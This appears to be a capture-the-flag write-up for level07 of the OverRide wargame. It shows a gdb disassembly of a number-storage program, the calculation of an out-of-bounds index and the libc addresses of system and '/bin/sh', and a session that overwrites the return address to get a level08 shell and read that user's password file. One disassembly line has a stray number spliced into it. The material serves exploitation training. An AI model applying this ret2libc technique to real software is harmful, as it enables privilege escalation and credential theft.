
```
(gdb) disas main
Dump of assembler code for function main:
   0x08048723 <+0>:     push   ebp
   0x08048724 <+1>:     mov    ebp,esp
   0x08048726 <+3>:     push   edi
   0x08048727 <+4>:     push   esi
   0x08048728 <+5>:     push   ebx
   0x08048729 <+6>:     and    esp,0xfffffff0
   0x0804872c <+9>:     sub    esp,0x1d0
   0x08048732 <+15>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048735 <+18>:    mov    DWORD PTR [esp+0x1c],eax
   0x08048739 <+22>:    mov    eax,DWORD PTR [ebp+0x10]
   0x0804873c <+25>:    mov    DWORD PTR [esp+0x18],eax
   0x08048740 <+29>:    mov    eax,gs:0x14
   0x08048746 <+35>:    mov    DWORD PTR [esp+0x1cc],eax
   0x0804874d <+42>:    xor    eax,eax
   0x0804874f <+44>:    mov    DWORD PTR [esp+0x1b4],0x0
   0x0804875a <+55>:    mov    DWORD PTR [esp+0x1b8],0x0
   0x08048765 <+66>:    mov    DWORD PTR [esp+0x1bc],0x0
   0x08048770 <+77>:    mov    DWORD PTR [esp+0x1c0],0x0
   0x0804877b <+88>:    mov    DWORD PTR [esp+0x1c4],0x0
   0x08048786 <+99>:    mov    DWORD PTR [esp+0x1c8],0x0
   0x08048791 <+110>:   lea    ebx,[esp+0x24]
   0x08048795 <+114>:   mov    eax,0x0
   0x0804879a <+119>:   mov    edx,0x64
   0x0804879f <+124>:   mov    edi,ebx
   0x080487a1 <+126>:   mov    ecx,edx
   0x080487a3 <+128>:   rep stos DWORD PTR es:[edi],eax
   0x080487a5 <+130>:   jmp    0x80487ea <main+199>
   0x080487a7 <+132>:   mov    eax,DWORD PTR [esp+0x1c]
   0x080487ab <+136>:   mov    eax,DWORD PTR [eax]
   0x080487ad <+138>:   mov    DWORD PTR [esp+0x14],0xffffffff
   0x080487b5 <+146>:   mov    edx,eax
   0x080487b7 <+148>:   mov    eax,0x0
   0x080487bc <+153>:   mov    ecx,DWORD PTR [esp+0x14]
   0x080487c0 <+157>:   mov    edi,edx
   0x080487c2 <+159>:   repnz scas al,BYTE PTR es:[edi]
   0x080487c4 <+161>:   mov    eax,ecx
   0x080487c6 <+163>:   not    eax
   0x080487c8 <+165>:   lea    edx,[eax-0x1]
   0x080487cb <+168>:   mov    eax,DWORD PTR [esp+0x1c]
   0x080487cf <+172>:   mov    eax,DWORD PTR [eax]
   0x080487d1 <+174>:   mov    DWORD PTR [esp+0x8],edx
   0x080487d5 <+178>:   mov    DWORD PTR [esp+0x4],0x0
   0x080487dd <+186>:   mov    DWORD PTR [esp],eax
   0x080487e0 <+189>:   call   0x80484f0 <memset@plt>
   0x080487e5 <+194>:   add    DWORD PTR [esp+0x1c],0x4
   0x080487ea <+199>:   mov    eax,DWORD PTR [esp+0x1c]
   0x080487ee <+203>:   mov    eax,DWORD PTR [eax]
   0x080487f0 <+205>:   test   eax,eax
   0x080487f2 <+207>:   jne    0x80487a7 <main+132>
   0x080487f4 <+209>:   jmp    0x8048839 <main+278>
   0x080487f6 <+211>:   mov    eax,DWORD PTR [esp+0x18]
   0x080487fa <+215>:   mov    eax,DWORD PTR [eax]
   0x080487fc <+217>:   mov    DWORD PTR [esp+0x14],0xffffffff
   0x08048804 <+225>:   mov    edx,eax
   0x08048806 <+227>:   mov    eax,0x0
   0x0804880b <+232>:   mov    ecx,DWORD PTR [esp+0x14]
   0x0804880f <+236>:   mov    edi,edx
   0x08048811 <+238>:   repnz scas al,BYTE PTR es:[edi]
   0x08048813 <+240>:   mov    eax,ecx
   0x08048815 <+242>:   not    eax
   0x08048817 <+244>:   lea    edx,[eax-0x1]
   0x0804881a <+247>:   mov    eax,DWORD PTR [esp+0x18]
   0x0804881e <+251>:   mov    eax,DWORD PTR [eax]
   0x08048820 <+253>:   mov    DWORD PTR [esp+0x8],edx
   0x08048824 <+257>:   mov    DWORD PTR [esp+0x4],0x0
   0x0804882c <+265>:   mov    DWORD PTR [esp],eax
   0x0804882f <+268>:   call   0x80484f0 <memset@plt>
   0x08048834 <+273>:   add    DWORD PTR [esp+0x18],0x4
   0x08048839 <+278>:   mov    eax,DWORD PTR [esp+0x18]
   0x0804883d <+282>:   mov    eax,DWORD PTR [eax]
   0x0804883f <+284>:   test   eax,eax
   0x08048841 <+286>:   jne    0x80487f6 <main+211>
   0x08048843 <+288>:   mov    DWORD PTR [esp],0x8048b38
   0x0804884a <+295>:   call   0x80484c0 <puts@plt>
   0x0804884f <+300>:   mov    eax,0x8048d4b
   0x08048854 <+305>:   mov    DWORD PTR [esp],eax
   0x08048857 <+308>:   call   0x8048470 <printf@plt>
   0x0804885c <+313>:   mov    DWORD PTR [esp+0x1b4],0x1
   0x08048867 <+324>:   mov    eax,ds:0x804a040
   0x0804886c <+329>:   mov    DWORD PTR [esp+0x8],eax
   0x08048870 <+333>:   mov    DWORD PTR [esp+0x4],0x14
   0x08048878 <+341>:   lea    eax,[esp+0x1b8]1073741824
   0x0804887f <+348>:   mov    DWORD PTR [esp],eax
   0x08048882 <+351>:   call   0x80484a0 <fgets@plt>
   0x08048887 <+356>:   lea    eax,[esp+0x1b8]
   0x0804888e <+363>:   mov    DWORD PTR [esp+0x14],0xffffffff
   0x08048896 <+371>:   mov    edx,eax
   0x08048898 <+373>:   mov    eax,0x0
   0x0804889d <+378>:   mov    ecx,DWORD PTR [esp+0x14]
   0x080488a1 <+382>:   mov    edi,edx
   0x080488a3 <+384>:   repnz scas al,BYTE PTR es:[edi]
   0x080488a5 <+386>:   mov    eax,ecx
   0x080488a7 <+388>:   not    eax
   0x080488a9 <+390>:   sub    eax,0x1
   0x080488ac <+393>:   sub    eax,0x1
   0x080488af <+396>:   mov    BYTE PTR [esp+eax*1+0x1b8],0x0
   0x080488b7 <+404>:   lea    eax,[esp+0x1b8]
   0x080488be <+411>:   mov    edx,eax
   0x080488c0 <+413>:   mov    eax,0x8048d5b
   0x080488c5 <+418>:   mov    ecx,0x5
   0x080488ca <+423>:   mov    esi,edx
   0x080488cc <+425>:   mov    edi,eax
   0x080488ce <+427>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080488d0 <+429>:   seta   dl
   0x080488d3 <+432>:   setb   al
   0x080488d6 <+435>:   mov    ecx,edx
   0x080488d8 <+437>:   sub    cl,al
   0x080488da <+439>:   mov    eax,ecx
   0x080488dc <+441>:   movsx  eax,al
   0x080488df <+444>:   test   eax,eax
   0x080488e1 <+446>:   jne    0x80488f8 <main+469>
   0x080488e3 <+448>:   lea    eax,[esp+0x24]
   0x080488e7 <+452>:   mov    DWORD PTR [esp],eax
   0x080488ea <+455>:   call   0x8048630 <store_number>
   0x080488ef <+460>:   mov    DWORD PTR [esp+0x1b4],eax
   0x080488f6 <+467>:   jmp    0x8048965 <main+578>
   0x080488f8 <+469>:   lea    eax,[esp+0x1b8]
   0x080488ff <+476>:   mov    edx,eax
   0x08048901 <+478>:   mov    eax,0x8048d61
   0x08048906 <+483>:   mov    ecx,0x4
   0x0804890b <+488>:   mov    esi,edx
   0x0804890d <+490>:   mov    edi,eax
   0x0804890f <+492>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x08048911 <+494>:   seta   dl
   0x08048914 <+497>:   setb   al
   0x08048917 <+500>:   mov    ecx,edx
   0x08048919 <+502>:   sub    cl,al
   0x0804891b <+504>:   mov    eax,ecx
   0x0804891d <+506>:   movsx  eax,al
   0x08048920 <+509>:   test   eax,eax
   0x08048922 <+511>:   jne    0x8048939 <main+534>
   0x08048924 <+513>:   lea    eax,[esp+0x24]
   0x08048928 <+517>:   mov    DWORD PTR [esp],eax
   0x0804892b <+520>:   call   0x80486d7 <read_number>
   0x08048930 <+525>:   mov    DWORD PTR [esp+0x1b4],eax
   0x08048937 <+532>:   jmp    0x8048965 <main+578>
   0x08048939 <+534>:   lea    eax,[esp+0x1b8]
   0x08048940 <+541>:   mov    edx,eax
   0x08048942 <+543>:   mov    eax,0x8048d66
   0x08048947 <+548>:   mov    ecx,0x4
   0x0804894c <+553>:   mov    esi,edx
   0x0804894e <+555>:   mov    edi,eax
   0x08048950 <+557>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x08048952 <+559>:   seta   dl
   0x08048955 <+562>:   setb   al
   0x08048958 <+565>:   mov    ecx,edx
   0x0804895a <+567>:   sub    cl,al
   0x0804895c <+569>:   mov    eax,ecx
   0x0804895e <+571>:   movsx  eax,al
   0x08048961 <+574>:   test   eax,eax
   0x08048963 <+576>:   je     0x80489cf <main+684>
   0x08048965 <+578>:   cmp    DWORD PTR [esp+0x1b4],0x0
   0x0804896d <+586>:   je     0x8048989 <main+614>
   0x0804896f <+588>:   mov    eax,0x8048d6b
   0x08048974 <+593>:   lea    edx,[esp+0x1b8]
   0x0804897b <+600>:   mov    DWORD PTR [esp+0x4],edx
   0x0804897f <+604>:   mov    DWORD PTR [esp],eax
   0x08048982 <+607>:   call   0x8048470 <printf@plt>
   0x08048987 <+612>:   jmp    0x80489a1 <main+638>
   0x08048989 <+614>:   mov    eax,0x8048d88
   0x0804898e <+619>:   lea    edx,[esp+0x1b8]
   0x08048995 <+626>:   mov    DWORD PTR [esp+0x4],edx
   0x08048999 <+630>:   mov    DWORD PTR [esp],eax
   0x0804899c <+633>:   call   0x8048470 <printf@plt>
   0x080489a1 <+638>:   lea    eax,[esp+0x1b8]
   0x080489a8 <+645>:   mov    DWORD PTR [eax],0x0
   0x080489ae <+651>:   mov    DWORD PTR [eax+0x4],0x0
   0x080489b5 <+658>:   mov    DWORD PTR [eax+0x8],0x0
   0x080489bc <+665>:   mov    DWORD PTR [eax+0xc],0x0
   0x080489c3 <+672>:   mov    DWORD PTR [eax+0x10],0x0
   0x080489ca <+679>:   jmp    0x804884f <main+300>
   0x080489cf <+684>:   nop
   0x080489d0 <+685>:   mov    eax,0x0
   0x080489d5 <+690>:   mov    esi,DWORD PTR [esp+0x1cc]
   0x080489dc <+697>:   xor    esi,DWORD PTR gs:0x14
   0x080489e3 <+704>:   je     0x80489ea <main+711>
   0x080489e5 <+706>:   call   0x80484b0 <__stack_chk_fail@plt>
   0x080489ea <+711>:   lea    esp,[ebp-0xc]
   0x080489ed <+714>:   pop    ebx
   0x080489ee <+715>:   pop    esi
   0x080489ef <+716>:   pop    edi
   0x080489f0 <+717>:   pop    ebp
   0x080489f1 <+718>:   ret
End of assembler dump.
```


```
overflow  : 1073741824
EIP is at : 1073741824 + 114 = 1073741938
system    : 0xf7e6aed0 = 4159090384₁₀
"/bin/sh" :
            offfset = 15d7ec
            0xf7e2c000 + 0x15d7ec = 0xf7f897ec
                                    4160264172₁₀

level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ id
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```